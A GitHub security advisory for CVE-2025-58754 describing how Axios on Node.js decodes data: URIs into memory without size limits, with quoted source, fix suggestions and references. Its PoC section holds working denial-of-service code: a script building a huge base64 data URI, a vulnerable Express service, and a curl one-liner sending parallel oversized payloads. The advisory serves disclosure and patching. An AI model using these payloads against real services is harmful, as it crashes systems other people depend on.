# [H] Axios is vulnerable to DoS attack through lack of data size check

## Summary
Severity: High
Advisory: GHSA-4hjh-wcwx-xvwj
CVE: CVE-2025-58754
CWE: CWE-770
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2025-09-11
Source: https://github.com/advisories/GHSA-4hjh-wcwx-xvwj
Type: github-advisory

## Affected
- npm: `axios` — affected >=1.0.0 <1.12.0
- npm: `axios` — affected >=0.28.0 <0.30.2

## Details
## Summary

When Axios runs on Node.js and is given a URL with the `data:` scheme, it does not perform HTTP. Instead, its Node http adapter decodes the entire payload into memory (`Buffer`/`Blob`) and returns a synthetic 200 response.
This path ignores `maxContentLength` / `maxBodyLength` (which only protect HTTP responses), so an attacker can supply a very large `data:` URI and cause the process to allocate unbounded memory and crash (DoS), even if the caller requested `responseType: 'stream'`.

## Details

The Node adapter (`lib/adapters/http.js`) supports the `data:` scheme. When `axios` encounters a request whose URL starts with `data:`, it does not perform an HTTP request. Instead, it calls `fromDataURI()` to decode the Base64 payload into a Buffer or Blob.

Relevant code from [`[httpAdapter](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L231)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L231):

```js
const fullPath = buildFullPath(config.baseURL, config.url, config.allowAbsoluteUrls);
const parsed = new URL(fullPath, platform.hasBrowserEnv ? platform.origin : undefined);
const protocol = parsed.protocol || supportedProtocols[0];

if (protocol === 'data:') {
  let convertedData;
  if (method !== 'GET') {
    return settle(resolve, reject, { status: 405, ... });
  }
  convertedData = fromDataURI(config.url, responseType === 'blob', {
    Blob: config.env && config.env.Blob
  });
  return settle(resolve, reject, { data: convertedData, status: 200, ... });
}
```

The decoder is in [`[lib/helpers/fromDataURI.js](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/helpers/fromDataURI.js#L27)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/helpers/fromDataURI.js#L27):

```js
export default function fromDataURI(uri, asBlob, options) {
  ...
  if (protocol === 'data') {
    uri = protocol.length ? uri.slice(protocol.length + 1) : uri;
    const match = DATA_URL_PATTERN.exec(uri);
    ...
    const body = match[3];
    const buffer = Buffer.from(decodeURIComponent(body), isBase64 ? 'base64' : 'utf8');
    if (asBlob) { return new _Blob([buffer], {type: mime}); }
    return buffer;
  }
  throw new AxiosError('Unsupported protocol ' + protocol, ...);
}
```

* The function decodes the entire Base64 payload into a Buffer with no size limits or sanity checks.
* It does **not** honour `config.maxContentLength` or `config.maxBodyLength`, which only apply to HTTP streams.
* As a result, a `data:` URI of arbitrary size can cause the Node process to allocate the entire content into memory.

In comparison, normal HTTP responses are monitored for size, the HTTP adapter accumulates the response into a buffer and will reject when `totalResponseBytes` exceeds [`[maxContentLength](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L550)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L550). No such check occurs for `data:` URIs.


## PoC

```js
const axios = require('axios');

async function main() {
  // this example decodes ~120 MB
  const base64Size = 160_000_000; // 120 MB after decoding
  const base64 = 'A'.repeat(base64Size);
  const uri = 'data:application/octet-stream;base64,' + base64;

  console.log('Generating URI with base64 length:', base64.length);
  const response = await axios.get(uri, {
    responseType: 'arraybuffer'
  });

  console.log('Received bytes:', response.data.length);
}

main().catch(err => {
  console.error('Error:', err.message);
});
```

Run with limited heap to force a crash:

```bash
node --max-old-space-size=100 poc.js
```

Since Node heap is capped at 100 MB, the process terminates with an out-of-memory error:

```
<--- Last few GCs --->
…
FATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory
1: 0x… node::Abort() …
…
```

Mini Real App PoC:
A small link-preview service that uses axios streaming, keep-alive agents, timeouts, and a JSON body. It allows data: URLs which axios fully ignore `maxContentLength `, `maxBodyLength` and decodes into memory on Node before streaming enabling DoS.

```js
import express from "express";
import morgan from "morgan";
import axios from "axios";
import http from "node:http";
import https from "node:https";
import { PassThrough } from "node:stream";

const keepAlive = true;
const httpAgent = new http.Agent({ keepAlive, maxSockets: 100 });
const httpsAgent = new https.Agent({ keepAlive, maxSockets: 100 });
const axiosClient = axios.create({
  timeout: 10000,
  maxRedirects: 5,
  httpAgent, httpsAgent,
  headers: { "User-Agent": "axios-poc-link-preview/0.1 (+node)" },
  validateStatus: c => c >= 200 && c < 400
});

const app = express();
const PORT = Number(process.env.PORT || 8081);
const BODY_LIMIT = process.env.MAX_CLIENT_BODY || "50mb";

app.use(express.json({ limit: BODY_LIMIT }));
app.use(morgan("combined"));

app.get("/healthz", (req,res)=>res.send("ok"));

/**
 * POST /preview { "url": "<http|https|data URL>" }
 * Uses axios streaming but if url is data:, axios fully decodes into memory first (DoS vector).
 */

app.post("/preview", async (req, res) => {
  const url = req.body?.url;
  if (!url) return res.status(400).json({ error: "missing url" });

  let u;
  try { u = new URL(String(url)); } catch { return res.status(400).json({ error: "invalid url" }); }

  // Developer allows using data:// in the allowlist
  const allowed = new Set(["http:", "https:", "data:"]);
  if (!allowed.has(u.protocol)) return res.status(400).json({ error: "unsupported scheme" });

  const controller = new AbortController();
  const onClose = () => controller.abort();
  res.on("close", onClose);

  const before = process.memoryUsage().heapUsed;

  try {
    const r = await axiosClient.get(u.toString(), {
      responseType: "stream",
      maxContentLength: 8 * 1024, // Axios will ignore this for data:
      maxBodyLength: 8 * 1024,    // Axios will ignore this for data:
      signal: controller.signal
    });

    // stream only the first 64KB back
    const cap = 64 * 1024;
    let sent = 0;
    const limiter = new PassThrough();
    r.data.on("data", (chunk) => {
      if (sent + chunk.length > cap) { limiter.end(); r.data.destroy(); }
      else { sent += chunk.length; limiter.write(chunk); }
    });
    r.data.on("end", () => limiter.end());
    r.data.on("error", (e) => limiter.destroy(e));

    const after = process.memoryUsage().heapUsed;
    res.set("x-heap-increase-mb", ((after - before)/1024/1024).toFixed(2));
    limiter.pipe(res);
  } catch (err) {
    const after = process.memoryUsage().heapUsed;
    res.set("x-heap-increase-mb", ((after - before)/1024/1024).toFixed(2));
    res.status(502).json({ error: String(err?.message || err) });
  } finally {
    res.off("close", onClose);
  }
});

app.listen(PORT, () => {
  console.log(`axios-poc-link-preview listening on http://0.0.0.0:${PORT}`);
  console.log(`Heap cap via NODE_OPTIONS, JSON limit via MAX_CLIENT_BODY (default ${BODY_LIMIT}).`);
});
```
Run this app and send 3 post requests:
```sh
SIZE_MB=35 node -e 'const n=+process.env.SIZE_MB*1024*1024; const b=Buffer.alloc(n,65).toString("base64"); process.stdout.write(JSON.stringify({url:"data:application/octet-stream;base64,"+b}))' \
| tee payload.json >/dev/null
seq 1 3 | xargs -P3 -I{} curl -sS -X POST "$URL" -H 'Content-Type: application/json' --data-binary @payload.json -o /dev/null```
```

---

## Suggestions

1. **Enforce size limits**
   For `protocol === 'data:'`, inspect the length of the Base64 payload before decoding. If `config.maxContentLength` or `config.maxBodyLength` is set, reject URIs whose payload exceeds the limit.

2. **Stream decoding**
   Instead of decoding the entire payload in one `Buffer.from` call, decode the Base64 string in chunks using a streaming Base64 decoder. This would allow the application to process the data incrementally and abort if it grows too large.

## References
- https://github.com/axios/axios/security/advisories/GHSA-4hjh-wcwx-xvwj
- https://nvd.nist.gov/vuln/detail/CVE-2025-58754
- https://github.com/axios/axios/pull/7011
- https://github.com/axios/axios/pull/7034
- https://github.com/axios/axios/commit/945435fc51467303768202250debb8d4ae892593
- https://github.com/axios/axios/commit/a1b1d3f073a988601583a604f5f9f5d05a3d0b67
- https://github.com/axios/axios/commit/c30252f685e8f4326722de84923fcbc8cf557f06
- https://github.com/axios/axios
- https://github.com/axios/axios/releases/tag/v0.30.2
- https://github.com/axios/axios/releases/tag/v1.12.0
